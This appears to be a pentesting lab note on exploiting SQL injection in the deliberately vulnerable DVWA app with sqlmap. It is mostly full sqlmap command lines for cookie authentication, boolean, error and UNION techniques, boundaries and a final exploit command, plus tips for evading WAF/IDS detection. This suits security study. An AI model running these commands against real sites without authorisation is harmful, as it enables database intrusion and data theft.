# 01 - Exploit

Search Tag: #sql-injection #sqlmap #boolean-based #error-based #union #dvwa

TODO: Fill in the rest of the output when necessary

## 1.1 - Authenticate with Cookies

### 1.1.1 - Grab from web console

- To add cookies open the web console **`CTRL + SHIFT + K`** in Firefox. Then type `document.cookie` to copy the cookies to allow SQLMap to authenticate.

### 1.1.2 - Copy from the storage

- Open the storage **`SHIFT + F9`** in Firefox. Copy the **Name** and **Value** of the cookies.

- SQLMap will automate by injecting queries of every possible techniques by default it uses `--technique=BEUSTQ` and it'll enumerate the DBMS server.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --method="GET" --random-agent
```

### 1.1.3 - Specify Database Management System Backend

- Force the DBMS to skip automatic enumeration using the flag `--dbms=mysql`

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --method="GET" --random-agent --dbms=mysql
```

## 1.2 - Authentication methods without using cookies

### 1.2.1 - Direct connection to the database

- If the DBMS backend has an exposed port when probing the server with `nmap` and you have credentials.

```
$ sqlmap -d "mysql://dvwa:"p@ssw0rd"@dvwa.local:3306/dvwa" -f --banner --dbs --users
```

   --smart             Perform thorough tests only if positive heuristic(s)

## 1.3 - Specify SQL query technique

- You can specify SQL injection techniques. It also speeds up the process.

### 1.3.1 - Boolean-Based Query SQL Injection

- We can also specify a [[02 - Craft Exploit|boolean-based blind]] query that can be used for bypassing form-based authentication. This requires you to understand how the backend works explained from [[Pentesting Phases/WebApp Hacking/Injection/SQL Injection/01 - In-Band SQL Injection/Lab/01 - DVWA/Difficulty/Low/Manual/01 - Boolean-Based Query SQL Injection/01 - Blackbox Testing|blackbox testing]] section.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --method="GET" --random-agent --dbms=mysql --technique=B
```

- To narrow it down even further we can filter the SQL query payloads based on the XML tags contains title (`<title>`) or payload (`<payload>`) which uses in `sqlmap/data/xml/payloads/` directory. We've crafted the payload with just the `OR` operator to [[02 - Craft Exploit#^5404cb|exploit]] it.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --method="GET" --random-agent --dbms=mysql --technique=B --test-filter="OR [RANDNUM]=[RANDNUM]"
```

### 1.3.2 - Error-Based Query SQL Injection

- It's often referred as double query or subquery injection.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --method="GET" --random-agent --dbms=mysql --technique=E
```

### 1.3.3 - UNION Query SQL Injection

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --method="GET" --random-agent --dbms=mysql --technique=U
```

- You can specify number of columns after performing [[Pentesting Phases/WebApp Hacking/Injection/SQL Injection/01 - In-Band SQL Injection/Lab/01 - DVWA/Difficulty/Low/Manual/03 - UNION Query SQL Injection/01 - Database Reconnaissance#^78ef92|fields enumeration]].

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --method="GET" --random-agent --dbms=mysql --technique=U --union-cols=2
```

- By default when enumerating the number of fields it uses `NULL` character. In some instances that WAF/IDS might flag it. We can use `--union-char` with a random combination of characters.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --method="GET" --random-agent --dbms=mysql --technique=U --union-cols=2 --union-char="1234567890"
```

- Some instances of DBMSes may require a valid table in order to proceed by exploiting the vulnerability. Especially when it comes to UNION technique we can use `--union-from` to specify the table `mysql.user` that comes by default in MySQL.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --method="GET" --random-agent --dbms=mysql --technique=U --union-cols=2 --union-from=mysql.user
```

## 1.4 - Specify Boundaries

- You can specify the boundaries with flags `--prefix="'"` and `--suffix="#"` after performing manual enumeration in the [[02 - Craft Exploit#^a3394c|joining the query]] section.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --method="GET" --random-agent --dbms=mysql --prefix="'" --suffix="#"
```

- To combine everything in one command based on the vulnerable webapp we've encountered. This is the final exploit via UNION technique.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --method="GET" --random-agent --dbms=mysql --prefix="'" --suffix="#" --technique=U --union-cols=2 --union-from=mysql.user
```